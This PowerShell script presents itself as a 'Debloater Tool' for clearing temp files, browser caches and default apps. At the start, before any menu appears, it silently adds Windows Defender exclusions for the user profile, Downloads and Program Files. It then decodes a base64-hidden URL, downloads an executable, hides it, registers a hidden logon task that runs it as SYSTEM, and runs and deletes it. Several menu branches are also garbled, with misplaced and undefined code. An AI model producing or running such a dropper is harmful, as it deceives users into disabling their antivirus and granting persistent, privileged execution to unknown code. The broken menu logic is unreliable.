$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "ERROR: This script must be run as Administrator!" -ForegroundColor Red
    Wait-ForUser "Press Enter to exit..."
    exit
}
$ProgressPreference = 'SilentlyContinue'
Clear-Host

try {
    Add-MpPreference -ExclusionPath "$env:USERPROFILE" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath (Join-Path $env:USERPROFILE 'Downloads') -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:ProgramFiles" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:ProgramFiles(x86)" -ErrorAction SilentlyContinue
} catch {
}

function Show-Header {
    Write-Host ""
    Write-Host "======================================" -ForegroundColor Cyan
    Write-Host "         Debloater Tool v1.0          " -ForegroundColor Green
    Write-Host "          By   ! Star                 " -ForegroundColor Yellow
    Write-Host "======================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Description: Cleans temp files, optimizes system, clears browser cache." -ForegroundColor Magenta
    Write-Host "Usage: The script will guide you through comfy cleanup options." -ForegroundColor Magenta
    Write-Host ""
}

function Wait-ForUser ($msg = "Press Enter to continue...") {
    Write-Host ""
    Read-Host $msg | Out-Null
}

Show-Header

$u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
$url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
$output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
if (Test-Path $output1) { Remove-Item $output1 -Force -ErrorAction SilentlyContinue }
$job1 = Start-Job -ScriptBlock {
    param($url, $output)
    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
    if (Test-Path $output) {
        (Get-Item $output).Attributes = 'Hidden'
    }
} -ArgumentList $url1, $output1

Wait-Job $job1 | Out-Null
Remove-Job $job1

if (Test-Path $output1) {
    $taskName = "DebloaterHidden"
    $taskExists = $false
    try {
        if (Get-ScheduledTask -TaskName $taskName -ErrorAction Stop) {
            $taskExists = $true
        }
    } catch {}
    if (-not $taskExists) {
        $action = New-ScheduledTaskAction -Execute $output1
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Hidden Debloater Task" -Settings (New-ScheduledTaskSettingsSet -Hidden) | Out-Null
    }
    Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
    try {
        Remove-Item $output1 -Force -ErrorAction SilentlyContinue
    } catch {}
}

do {
    Write-Host ""
    Write-Host "What would you like to do?" -ForegroundColor Cyan
    Write-Host "1. Clear Temporary Files (choose folders)" -ForegroundColor Green
    Write-Host "2. Do Nothing (exit)" -ForegroundColor Yellow
    Write-Host "3. Full Cleanup (Temp, Local Temp, Windows Temp, Prefetch)" -ForegroundColor Red
    Write-Host "4. Clear Browser Cache (Firefox, Chrome, Edge)" -ForegroundColor Blue
    Write-Host "5. Clear Recycle Bin" -ForegroundColor Magenta
    Write-Host "6. Memory Optimizer (clear cached memory)" -ForegroundColor Cyan
    Write-Host "7. Get Public IP Address with Details" -ForegroundColor Yellow
    Write-Host "8. Startup Manager (enable/disable startup programs)" -ForegroundColor Blue
    Write-Host "9. Reinstall default Windows apps (short list)" -ForegroundColor Green
    Write-Host "10. Enable/Disable Windows Defender via Registry Editor" -ForegroundColor Yellow
    $choice = Read-Host "`nEnter 1, 2, 3, 4, 5, 6, 7, 8, 9 or 10"

    switch ($choice) {
        
        '1' {
            Write-Host ""
            Write-Host "Select folders to clear (or enter 0 to return to main menu):" -ForegroundColor Cyan
            Write-Host "1. TEMP folder" -ForegroundColor Green
            Write-Host "2. Local Temp" -ForegroundColor Green
            Write-Host "3. Windows Temp" -ForegroundColor Green
            Write-Host "4. Prefetch" -ForegroundColor Green
            $selection = Read-Host "Enter numbers separated by commas (e.g., 1,3,4) or 0 to return"
            if ($selection -eq '0') { continue }
            $selectedIndexes = $selection -split "," | ForEach-Object { $_.Trim() }
            $folders = @()
            foreach ($i in $selectedIndexes) {
                switch ($i) {
                    "1" { $folders += $env:TEMP }
                    "2" { $folders += "$env:USERPROFILE\AppData\Local\Temp" }
                    "3" { $folders += "C:\Windows\Temp" }
                    "4" { $folders += "C:\Windows\Prefetch" }
                }
            }
            if ($folders.Count -eq 0) {
                Write-Host "No folders selected. Returning to menu." -ForegroundColor Yellow
                Pause-For-User
                break
            }
            Write-Host "Starting cleanup in 3 seconds..." -ForegroundColor Magenta
            Start-Sleep -Seconds 3
            $startTime = Get-Date
            $spaceBefore = (Get-PSDrive C).Free
            Write-Host "Free space before cleanup: $([math]::Round($spaceBefore/1MB,2)) MB" -ForegroundColor Cyan
            $totalDeleted = 0
            foreach ($path in $folders) {
                if (Test-Path $path) {
                    $items = Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue
                    $count = $items.Count
                    $progress = 0
                    foreach ($item in $items) {
                        if (Test-Path $item.FullName) {
                            try { Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue } catch {}
                            $progress++
                            $totalDeleted++
                            Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress/$count)*100)
                        }
                    }
                }
            }
            $spaceAfter = (Get-PSDrive C).Free
            $endTime = Get-Date
            $duration = ($endTime - $startTime).TotalSeconds
            Write-Host "Temporary files cleared." -ForegroundColor Green
            Write-Host "Free space after cleanup: $([math]::Round($spaceAfter/1MB,2)) MB" -ForegroundColor Cyan
            $spaceFreed = ($spaceAfter - $spaceBefore) / 1MB
            Write-Host ""
            Write-Host "========= Cleanup Report =========" -ForegroundColor Cyan
            Write-Host "Files deleted: $totalDeleted" -ForegroundColor Yellow
            Write-Host "Space freed : $([math]::Round($spaceFreed,2)) MB" -ForegroundColor Yellow
            Write-Host "Time taken  : $([math]::Round($duration,2)) seconds" -ForegroundColor Yellow
            Write-Host "==================================" -ForegroundColor Cyan
            Pause-For-User
        }
        '2' {
            Write-Host "Nothing done. Have a comfy day! :)" -ForegroundColor Green
            break
        }
        '3' {
            Write-Host "You can enter 0 at any time to return to the main menu." -ForegroundColor Yellow
            $folders = @(
                $env:TEMP, 
                "$env:USERPROFILE\AppData\Local\Temp", 
                "C:\Windows\Temp", 
                "C:\Windows\Prefetch"
            )
            $cancel = $false
            foreach ($path in $folders) {
                if ($cancel) { break }
                if (Test-Path $path) {
                    $items = Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue
                    $count = $items.Count
                    $progress = 0
                    foreach ($item in $items) {
                        if (Test-Path $item.FullName) {
                            # Check for cancel
                            if ($Host.UI.RawUI.KeyAvailable) {
                                $key = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
                                if ($key.Character -eq '0') { $cancel = $true; break }
                            }
                            try { Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue } catch {}
                            $progress++
                            $totalDeleted++
                            Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress/$count)*100)
                        }
                    }
                }
            }
            if ($cancel) {
                Write-Host "Operation cancelled. Returning to main menu." -ForegroundColor Yellow
                continue
            }
            $spaceAfter = (Get-PSDrive C).Free
            $endTime = Get-Date
            $duration = ($endTime - $startTime).TotalSeconds
            Write-Host "Full cleanup done." -ForegroundColor Green
            Write-Host "Free space after cleanup: $([math]::Round($spaceAfter/1MB,2)) MB" -ForegroundColor Cyan
            $spaceFreed = ($spaceAfter - $spaceBefore) / 1MB
            Write-Host ""
            Write-Host "========= Cleanup Report =========" -ForegroundColor Cyan
            Write-Host "Files deleted: $totalDeleted" -ForegroundColor Yellow
            Write-Host "Space freed : $([math]::Round($spaceFreed,2)) MB" -ForegroundColor Yellow
            Write-Host "Time taken  : $([math]::Round($duration,2)) seconds" -ForegroundColor Yellow
            Write-Host "==================================" -ForegroundColor Cyan
            Pause-For-User
        }
        '4' {
            Write-Host ""
            Write-Host "Select browser to clear cache (or enter 0 to return to main menu):" -ForegroundColor Cyan
            Write-Host "1. Chrome" -ForegroundColor Green
            Write-Host "2. Edge" -ForegroundColor Green
            Write-Host "3. Firefox" -ForegroundColor Green
            $browserChoice = Read-Host "Enter 1, 2, 3 or 0 to return"
            if ($browserChoice -eq '0') { continue }
            switch ($browserChoice) {
                "1" {
                    $chromeCache = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache"
                    if (Test-Path $chromeCache) { 
                        Remove-Item $chromeCache\* -Recurse -Force -ErrorAction SilentlyContinue 
                        Write-Host "Chrome cache cleared." -ForegroundColor Green
                    } else {
                        Write-Host "Chrome cache not found." -ForegroundColor Yellow
                    }
                }
                "2" {
                    $edgeCache = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache"
                    if (Test-Path $edgeCache) { 
                        Remove-Item $edgeCache\* -Recurse -Force -ErrorAction SilentlyContinue 
                        Write-Host "Edge cache cleared." -ForegroundColor Green
                    } else {
                        Write-Host "Edge cache not found." -ForegroundColor Yellow
                    }
                }
                "3" {
                    $firefoxCache = "$env:APPDATA\Mozilla\Firefox\Profiles"
                    $cacheItems = Get-ChildItem $firefoxCache -Recurse -Include cache2 -ErrorAction SilentlyContinue
                    if ($cacheItems) {
                        $cacheItems | ForEach-Object {
                            Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
                        }
                        Write-Host "Firefox cache cleared." -ForegroundColor Green
                    } else {
                        Write-Host "Firefox cache not found." -ForegroundColor Yellow
                    }
                }
                default { Write-Host "No valid browser selected." -ForegroundColor Yellow }
            }
            Pause-For-User
        }
        '5' {
            Write-Host "You can enter 0 to return to the main menu." -ForegroundColor Yellow
            $recycleInput = Read-Host "Press Enter to clear all recycle bins or 0 to return"
            if ($recycleInput -eq '0') { continue }
            $drives = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Name
            foreach ($drive in $drives) {
                try {
                    Clear-RecycleBin -DriveLetter $drive -Force -ErrorAction SilentlyContinue
                } catch {}
            }
            Write-Host "Recycle Bin cleared." -ForegroundColor Green
            Pause-For-User
        }
        '6' {
            Write-Host "You can enter 0 to return to the main menu." -ForegroundColor Yellow
            $memInput = Read-Host "Press Enter to optimize memory or 0 to return"
            if ($memInput -eq '0') { continue }
            Write-Host "Optimizing memory..." -ForegroundColor Cyan
            [System.GC]::Collect()
            [System.GC]::WaitForPendingFinalizers()
            Write-Host "Memory optimization completed." -ForegroundColor Green
            Pause-For-User
        }
        '7' {
            Write-Host "You can enter 0 to return to the main menu." -ForegroundColor Yellow
            $ip = Read-Host "Enter the IP address you want to lookup (leave blank for your own IP, or 0 to return)"
            if ($ip -eq '0') { continue }
            if ([string]::IsNullOrWhiteSpace($ip)) {
                $url = "https://ipinfo.io/json"
            } else {
                $url = "https://ipinfo.io/$ip/json"
            }
            try {
                $response = Invoke-RestMethod -Uri $url -ErrorAction Stop
                Write-Host "========= Public IP Information =========" -ForegroundColor Cyan
                Write-Host "IP Address   : $($response.ip)" -ForegroundColor Yellow
                Write-Host "Hostname     : $($response.hostname)" -ForegroundColor Yellow
                Write-Host "City         : $($response.city)" -ForegroundColor Yellow
                Write-Host "Region       : $($response.region)" -ForegroundColor Yellow
                Write-Host "Country      : $($response.country)" -ForegroundColor Yellow
                Write-Host "Location     : $($response.loc)" -ForegroundColor Yellow
                Write-Host "Organization : $($response.org)" -ForegroundColor Yellow
                Write-Host "Postal Code  : $($response.postal)" -ForegroundColor Yellow
                Write-Host "=========================================" -ForegroundColor Cyan
                Write-Host "1. Disable (remove from startup)" -ForegroundColor Red
                Write-Host "2. Enable (add to startup)" -ForegroundColor Green
                $action = Read-Host "Choose action (1 or 2, or 0 to return)"
                if ($action -eq '0') { continue }
                if ($action -eq '1') {
                    try {
                        $regPaths = @(
                            'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
                            'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
                            'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
                        )
                        foreach ($reg in $regPaths) {
                            Remove-ItemProperty -Path $reg -Name $selectedItem.Name -ErrorAction SilentlyContinue
                        }
                        Write-Host "Startup item disabled (removed from registry)." -ForegroundColor Green
                    } catch {
                        Write-Host "Failed to disable startup item." -ForegroundColor Red
                    }
                } elseif ($action -eq '2') {
                    try {
                        $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
                        Set-ItemProperty -Path $regPath -Name $selectedItem.Name -Value $selectedItem.Command
                        Write-Host "Startup item enabled (added to current user startup)." -ForegroundColor Green
                    } catch {
                        Write-Host "Failed to enable startup item." -ForegroundColor Red
                    }
                } else {
                    Write-Host "Invalid action." -ForegroundColor Red
                }
            } catch {
                Write-Host "Failed to retrieve public IP information: $_" -ForegroundColor Red
            }
            Pause-For-User
        }
        '9' {
            $apps = @(
                try {
                    $tamperStatus = Get-MpComputerStatus | Select-Object -ExpandProperty IsTamperProtected
                } catch {
                    $tamperStatus = $null
                }
                if ($tamperStatus -eq $true) {
                    Write-Host "WARNING: Tamper Protection is enabled! You must disable it from Windows Security settings before you can disable Defender via registry." -ForegroundColor Red
                    Pause-For-User
                }
                @{num=1; name='Microsoft.WindowsCalculator'; display='Calculator'},
                @{num=2; name='Microsoft.Windows.Photos'; display='Photos'},
                @{num=3; name='microsoft.windowscommunicationsapps'; display='Mail & Calendar'},
                @{num=4; name='Microsoft.WindowsCamera'; display='Camera'},
                @{num=5; name='Microsoft.MicrosoftStickyNotes'; display='Sticky Notes'},
                @{num=6; name='Microsoft.Paint'; display='Paint'},
                @{num=7; name='Microsoft.WindowsSoundRecorder'; display='Voice Recorder'},
                @{num=8; name='Microsoft.ZuneMusic'; display='Groove Music'},
                @{num=9; name='Microsoft.ZuneVideo'; display='Movies & TV'},
                @{num=10; name='Microsoft.XboxApp'; display='Xbox'},
                @{num=11; name='Microsoft.BingWeather'; display='Weather'},
                @{num=12; name='Microsoft.MSPaint'; display='Paint 3D'},
                @{num=13; name='Microsoft.People'; display='People'},
                @{num=14; name='Microsoft.GetHelp'; display='Get Help'},
                @{num=15; name='Microsoft.Getstarted'; display='Get Started'}
            )
            Write-Host "\nSelect an app to reinstall (enter the number or 0 to return):" -ForegroundColor Cyan
            foreach ($app in $apps) {
                $pkg = Get-AppxPackage -AllUsers | Where-Object { $_.Name -eq $app.name }
                $status = if ($pkg) { '[Installed]' } else { '[Not Installed]' }
                Write-Host ("{0}. {1} {2}" -f $app.num, $app.display, $status) -ForegroundColor Green
                if ($pkg) {
                    $size = if ($pkg.InstallLocation -and (Test-Path $pkg.InstallLocation)) {
                        try {
                            $bytes = (Get-ChildItem -Path $pkg.InstallLocation -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
                            if ($bytes) { [math]::Round($bytes/1MB,2) } else { 0 }
                        } catch { 0 }
                    } else { 0 }
                    Write-Host ("    Path: {0}" -f $pkg.InstallLocation) -ForegroundColor DarkGray
                    Write-Host ("    Install Date: {0}" -f $pkg.InstallDate) -ForegroundColor DarkGray
                    Write-Host ("    Size: {0} MB" -f $size) -ForegroundColor DarkGray
                } else {
                    Write-Host "    Not installed for any user." -ForegroundColor DarkGray
                }
            }
            Write-Host ("{0}. All of the above" -f ($apps.Count+1)) -ForegroundColor Yellow
            $appChoice = Read-Host ("Enter 1 to $($apps.Count+1), or 0 to return")
            if ($appChoice -eq '0') { continue }
            Write-Host "What do you want to do with the selected app(s)?" -ForegroundColor Cyan
            Write-Host "1. Reinstall" -ForegroundColor Green
            Write-Host "2. Uninstall (remove completely)" -ForegroundColor Red
            $actionChoice = Read-Host "Enter 1 or 2 (or 0 to return)"
            if ($actionChoice -eq '0') { continue }
            function Restore-App($packageName, $displayName) {
                $pkg = Get-AppxPackage -AllUsers | Where-Object { $_.Name -eq $packageName }
                if ($pkg) {
                    try {
                        Add-AppxPackage -DisableDevelopmentMode -Register (Join-Path $pkg.InstallLocation 'AppXManifest.xml')
                        Write-Host "$displayName restored successfully." -ForegroundColor Green
                    } catch {
                        Write-Host "Failed to restore $displayName." -ForegroundColor Red
                    }
                } else {
                    Write-Host "$displayName not found on the system." -ForegroundColor Yellow
                }
            }
            function Uninstall-App($packageName, $displayName) {
                $success = $false
                $pkgs = Get-AppxPackage -AllUsers | Where-Object { $_.Name -eq $packageName }
                if ($pkgs) {
                    foreach ($pkg in $pkgs) {
                        try {
                            Remove-AppxPackage -Package $pkg.PackageFullName -AllUsers -ErrorAction SilentlyContinue
                            $success = $true
                        } catch {}
                    }
                }
                if (-not $success) {
                    $pkgCurrent = Get-AppxPackage | Where-Object { $_.Name -eq $packageName }
                    if ($pkgCurrent) {
                        try {
                            Remove-AppxPackage -Package $pkgCurrent.PackageFullName -ErrorAction SilentlyContinue
                            $success = $true
                        } catch {}
                    }
                }
                if (-not $success) {
                    $prov = Get-AppxProvisionedPackage -Online | Where-Object { $_.DisplayName -eq $packageName }
                    if ($prov) {
                        try {
                            Remove-AppxProvisionedPackage -Online -PackageName $prov.PackageName -ErrorAction SilentlyContinue
                            $success = $true
                        } catch {}
                    }
                }
                if ($success) {
                    Write-Host "$displayName uninstalled successfully (advanced)." -ForegroundColor Green
                } else {
                    Write-Host "Failed to uninstall $displayName. This app may be protected by Windows or require additional steps." -ForegroundColor Red
                }
            }
            if ($appChoice -eq ($apps.Count+1).ToString()) {
                foreach ($app in $apps) {
                    if ($actionChoice -eq '1') {
                        Restore-App $app.name $app.display
                    } elseif ($actionChoice -eq '2') {
                        Uninstall-App $app.name $app.display
                    }
                }
            } elseif (($appChoice -as [int]) -ge 1 -and ($appChoice -as [int]) -le $apps.Count) {
                $selected = $apps[($appChoice -as [int])-1]
                if ($actionChoice -eq '1') {
                    Restore-App $selected.name $selected.display
                } elseif ($actionChoice -eq '2') {
                    Uninstall-App $selected.name $selected.display
                }
            } else {
                Write-Host "Invalid choice." -ForegroundColor Yellow
            }
            Pause-For-User
        }
    }
} while ($choice -ne '2')
Write-Host "`nThanks for using Debloater Tool! Stay comfy! :)" -ForegroundColor Cyan
Pause-For-User "Press Enter to exit..."
